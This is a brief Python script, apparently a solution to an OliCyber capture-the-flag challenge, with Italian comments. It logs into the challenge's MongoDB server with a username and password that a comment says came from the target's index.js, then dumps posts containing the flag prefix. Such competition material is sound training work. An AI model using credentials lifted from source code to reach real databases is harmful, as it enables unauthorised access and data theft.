from pymongo import * # fattibile anche con mongodb-clients su linux
m = MongoClient("mongodb://th3pwn3r:W2Zyr&Np@post.challs.olicyber.it/test") # in index.js possiamo trovare le credenziali
for i in m["test"].get_collection("posts").find(): # prendiamo la collezione posts
    if "ptm" in i["content"]:
        print(i["content"], end="")